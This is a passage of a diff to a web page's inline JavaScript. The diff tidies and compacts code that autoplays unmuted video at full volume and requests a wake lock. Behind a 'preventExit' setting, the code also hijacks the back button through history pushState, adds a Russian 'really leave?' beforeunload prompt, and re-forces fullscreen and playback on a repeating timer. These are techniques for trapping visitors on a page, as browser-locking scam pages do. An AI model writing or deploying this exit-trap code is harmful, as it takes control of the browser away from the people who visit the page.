-     ========================================================= */
+  /* ---------- STARTUP ---------- */
   function startupAttempt() {
     if (firstGestureDone) return;
-    console.log("[startup] trying auto-play + fullscreen");
-
-    video.muted  = false;
-    video.volume = 1.0;
-    video.loop   = CONFIG.loopVideo;
-
+    video.muted = false; video.volume = 1.0; video.loop = CONFIG.loopVideo;
     const p = video.play();
     if (p && p.catch) p.catch(() => {});
-
     tryFullscreen();
     requestWakeLock();
-
     if (p && p.then) {
-      p.then(() => {
-        activated = true;
-        setupWebAudio();
-        console.log("[startup] autoplay succeeded");
-      }).catch(() => {
-        console.log("[startup] autoplay rejected (expected)");
-      });
+      p.then(() => { activated = true; setupWebAudio(); }).catch(() => {});
     }
   }
 
-  /* =========================================================
-     POPSTATE / BEFOREUNLOAD
-     ========================================================= */
+  /* ---------- POPSTATE / BEFOREUNLOAD ---------- */
   if (CONFIG.preventExit) {
     try {
       history.pushState(null, "", location.href);
@@ -827,37 +718,24 @@
         if (firstGestureDone) tryFullscreen();
       });
     } catch (e) {}
-
     window.addEventListener("beforeunload", e => {
       if (!firstGestureDone) return;
       const msg = "Видео активно. Точно выйти?";
-      e.preventDefault();
-      e.returnValue = msg;
-      return msg;
+      e.preventDefault(); e.returnValue = msg; return msg;
     });
   }
 
-  /* =========================================================
-     ПЕРИОДИЧЕСКИЙ РЕТРАЙ
-     ========================================================= */
+  /* ---------- ПЕРИОДИЧЕСКИЙ РЕТРАЙ ---------- */
   setInterval(() => {
     if (!firstGestureDone) return;
-    tryFullscreen();
-    ensurePlaying();
+    tryFullscreen(); ensurePlaying();
     if (!wakeLock) requestWakeLock();
   }, CONFIG.retryInterval);
 
-  /* =========================================================
-     СТАРТ
-     ========================================================= */
+  /* ---------- СТАРТ ---------- */
   try { video.load(); } catch (e) {}
-
-  // Запускаем визуальный прогресс-бар на кнопке
   startProgress();
-
-  if (CONFIG.startupAttempt) {
-    setTimeout(startupAttempt, CONFIG.startupDelay);
-  }
+  if (CONFIG.startupAttempt) setTimeout(startupAttempt, CONFIG.startupDelay);
 
 })();
 </script>
